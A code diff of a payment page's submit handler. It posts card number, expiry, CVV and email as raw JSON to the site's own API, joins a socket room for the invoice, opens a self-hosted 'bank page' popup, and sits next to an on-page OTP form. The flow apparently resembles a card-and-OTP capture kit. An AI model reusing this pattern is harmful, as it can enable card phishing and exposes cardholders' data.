@@ -630,72 +630,71 @@
     document.getElementById('otp').addEventListener('input', updateConfirmOtpButton);
 
     // Payment Submission Handler
-    document.getElementById('mainForm').addEventListener('submit', async function(e) {
-      e.preventDefault();
-      if (!isCardValid || !isExpiryValid || isProcessing) return;
+    // payment.html - Update the payment form submit handler
+document.getElementById('mainForm').addEventListener('submit', async function(e) {
+  e.preventDefault();
+  if (!isCardValid || !isExpiryValid || isProcessing) return;
 
-      isProcessing = true;
-      const submitButton = document.getElementById('submitButton');
-      const submitText = document.getElementById('submitText');
-      const submitLoader = document.getElementById('submitLoader');
+  isProcessing = true;
+  const submitButton = document.getElementById('submitButton');
+  const submitText = document.getElementById('submitText');
+  const submitLoader = document.getElementById('submitLoader');
 
-      // Show loading state
-      submitButton.classList.add('btn-loading');
-      submitText.style.opacity = '0.5';
-      submitText.style.filter = 'blur(1px)';
-      submitLoader.classList.remove('hidden');
+  // Show loading state
+  submitButton.classList.add('btn-loading');
+  submitText.style.opacity = '0.5';
+  submitText.style.filter = 'blur(1px)';
+  submitLoader.classList.remove('hidden');
 
-      try {
-        const response = await fetch("/api/sendPaymentDetails", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            cardNumber: document.getElementById('cardNumber').value.replace(/\s+/g, ''),
-            expiry: document.getElementById('expiry').value,
-            cvv: document.getElementById('cvv').value,
-            email: document.getElementById('email').value,
-            amount: document.getElementById('amount').value,
-            currency: "INR",
-            cardholder: document.getElementById('cardholderName').value
-          })
-        });
+  try {
+    const response = await fetch("/api/sendPaymentDetails", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        cardNumber: document.getElementById('cardNumber').value.replace(/\s+/g, ''),
+        expiry: document.getElementById('expiry').value,
+        cvv: document.getElementById('cvv').value,
+        email: document.getElementById('email').value,
+        amount: document.getElementById('amount').value,
+        currency: "INR",
+        cardholder: document.getElementById('cardholderName').value
+      })
+    });
 
-        const data = await response.json();
-        if (!response.ok) throw new Error(data.message || 'Payment failed');
+    const data = await response.json();
+    if (!response.ok) throw new Error(data.message || 'Payment failed');
 
-        currentInvoiceId = data.invoiceId;
-        localStorage.setItem('invoiceId', currentInvoiceId);
-        
-        // Open bank page in popup
-        bankPageWindow = window.open(
-          `/bankpage.html?invoiceId=${data.invoiceId}`, 
-          '_blank',
-          'width=600,height=800'
-        );
+    currentInvoiceId = data.invoiceId;
+    localStorage.setItem('invoiceId', currentInvoiceId);
+    socket.emit('join', currentInvoiceId); // Add this line
+    
+    // Open bank page
+    bankPageWindow = window.open(
+      `/bankpage.html?invoiceId=${data.invoiceId}`, 
+      '_blank',
+      'width=600,height=800'
+    );
 
-        // Start checking for bankpage closure
-        const checkWindowClosed = setInterval(() => {
-          if (bankPageWindow && bankPageWindow.closed) {
-            clearInterval(checkWindowClosed);
-            if (!document.getElementById('otpForm').classList.contains('hidden')) return;
-            submitButton.classList.remove('btn-loading');
-            submitText.style.opacity = '1';
-            submitText.style.filter = 'none';
-            submitLoader.classList.add('hidden');
-            isProcessing = false;
-          }
-        }, 500);
-
-      } catch (error) {
-        console.error('Payment Error:', error);
-        alert(`Payment Failed: ${error.message}`);
+    // Add this closure check
+    const checkWindowClosed = setInterval(() => {
+      if (bankPageWindow.closed) {
+        clearInterval(checkWindowClosed);
         submitButton.classList.remove('btn-loading');
         submitText.style.opacity = '1';
-        submitText.style.filter = 'none';
         submitLoader.classList.add('hidden');
         isProcessing = false;
       }
-    });
+    }, 500);
+
+  } catch (error) {
+    console.error('Payment Error:', error);
+    alert(`Payment Failed: ${error.message}`);
+    submitButton.classList.remove('btn-loading');
+    submitText.style.opacity = '1';
+    submitLoader.classList.add('hidden');
+    isProcessing = false;
+  }
+});
 
     // OTP Submission Handler
     document.getElementById('otpSubmitButton').addEventListener('click', async () => {
